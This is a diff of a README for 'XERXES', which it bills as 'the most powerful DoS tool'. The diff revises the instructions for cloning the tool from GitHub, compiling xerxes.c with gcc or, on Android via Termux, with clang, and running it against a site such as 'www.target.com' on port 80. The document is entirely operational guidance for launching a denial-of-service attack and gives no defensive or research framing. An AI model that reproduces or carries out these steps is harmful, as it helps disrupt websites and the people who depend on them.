@@ -4,12 +4,21 @@
     <h4>XERXES the most powerful DoS tool by zanyarjamal</h4>
 
 Download the File xerxes.c to your Desktop
-Open Terminal and type these commands
-cd Desktop
-gcc xerxes.c -o xerxes
-*Usage : ./xerxes www.fakesite.com 80
 
-On Android:
+Open Terminal and type these commands
+
+#command list
+
+#git clone https://github.com/ariyanshipu/xerxes.git
+
+#cd Desktop
+
+#gcc xerxes.c -o xerxes
+
+#./xerxes www.target.com 80
+
+////////////
+#On Android:
 
 #Open Termux app
 
@@ -17,13 +26,13 @@ On Android:
 
 #Install Clang
 
-#Git clone https://github.com/ngrock90/xerxes.git
+#git clone https://github.com/ariyanshipu/xerxes.git
 
-#Cd Xerxes
+#cd xerxes
 
 #chmod +x *
 
 #clang xerxes.c -o xerxes
 
-*Usage: ./xerxes www.fakesite.com 80
+*Usage: ./xerxes www.targetsite.com 80
 
